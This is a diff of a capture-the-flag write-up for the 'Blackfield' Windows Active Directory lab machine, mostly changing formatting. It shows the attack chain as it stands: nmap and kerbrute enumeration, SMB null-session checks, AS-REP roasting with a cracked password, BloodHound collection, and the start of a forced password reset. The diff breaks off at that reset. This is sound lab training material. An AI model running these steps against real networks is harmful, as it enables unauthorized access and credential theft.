@@ -1,4 +1,5 @@
-                                                                BLACKFIELD
+																
+																BLACKFIELD
 
 <img width="1536" height="1024" alt="5325327" src="https://github.com/user-attachments/assets/1ae8ab62-ef76-4b27-bd70-ad000f1cb450" />
 
@@ -6,13 +7,17 @@
 > **OS:** Windows<br>
 > **Write-up by:** Butlipan
 
+---
 ## 🔍 Enumeration
 
 Let’s start our journey by performing enumeration with an Nmap scan.
 ```
 sudo nmap -sS -A -p- 10.129.43.83
 ```
-```
+
+<details> <summary><b>🔽 Expand Nmap Scan</b></summary>
+
+```text
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-16 07:13 CST
 Nmap scan report for 10.129.43.83
 Host is up (0.0077s latency).
@@ -45,10 +50,12 @@ Host script results:
 |   date: 2026-01-16T20:16:46
 |_  start_date: N/A
 ```
+</details>
+
 As you see, this machine is in AD environment, my favorite! From result you can read a few things: 
 - **Domain: BLACKFIELD.local**
-- **Active SMB**
-- **Active WinRM**
+- **Active `SMB`**
+- **Active `WinRM`**
 
 It gives us some vectors of potential attack.
 Let's move on to some AD enumeration.
@@ -60,7 +67,7 @@ In this type of machines I like to leave the [Kerbrute](https://github.com/ropno
 $ chmod +x kerbrute
 $ ./kerbrute userenum -d BLACKFIELD.local0 --dc 10.129.43.83 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
 ```
-Meanwhile, we can check SMB, maybe there's a null session which will propably open a few doors for us
+Meanwhile, we can check `SMB`, maybe there's a null session which will propably open a few doors for us
 ```
 $ smbmap -H 10.129.43.83 -u guest -p ""
 [+] IP: 10.129.43.83:445	Name: 10.129.43.83                                      
@@ -154,7 +161,7 @@ Version: v1.0.3 (9dad6e1) - 01/16/26 - Ronnie Flathers @ropnop
 2026/01/16 09:24:51 >  [+] VALID USERNAME:	 support@blackfield.local
 2026/01/16 09:24:51 >  Done! Tested 5 usernames (5 valid) in 5.017 seconds
 ```
-Okay, that's good omen. With that we can try some AS-REP roasting
+Okay, that's good omen. With that we can try some `AS-REP` roasting
 
 ## 💥AS-REP roasting
 
@@ -191,7 +198,7 @@ Speed.#2.........:  1465.1 kH/s (1.18ms) @ Accel:512 Loops:1 Thr:1 Vec:8
 ```
 #00^BlackKnight
 ```
-With those creds. we now have more vectores to attack. Firt, I tried a Evil-WinRm, but it didn't work, so i tried returimg back to SMB, a i found this
+With those creds. we now have more vectores to attack. Firt, I tried a Evil-WinRm, but it didn't work, so i tried returimg back to `SMB`, a i found this
 ```
 $ smbmap -H 10.129.43.83 -u support -p '#00^BlackKnight'
 [+] IP: 10.129.43.83:445	Name: 10.129.43.83                                      
@@ -218,7 +225,7 @@ bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.129
 ```
 <img width="1155" height="930" alt="obraz" src="https://github.com/user-attachments/assets/7ecc3c57-f852-4023-a3b4-65eab52d1b73" />
 
-It's very interesting find, aparently our user can force password changing without knowing previous one. This is possible because the support account has the ForceChangePassword extended right on the audit2020 object. Let's find out how to do that
+It's very interesting find, aparently our user can force password changing without knowing previous one. This is possible because the support account has the `ForceChangePassword` extended right on the audit2020 object. Let's find out how to do that
 
 ```
 Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line.
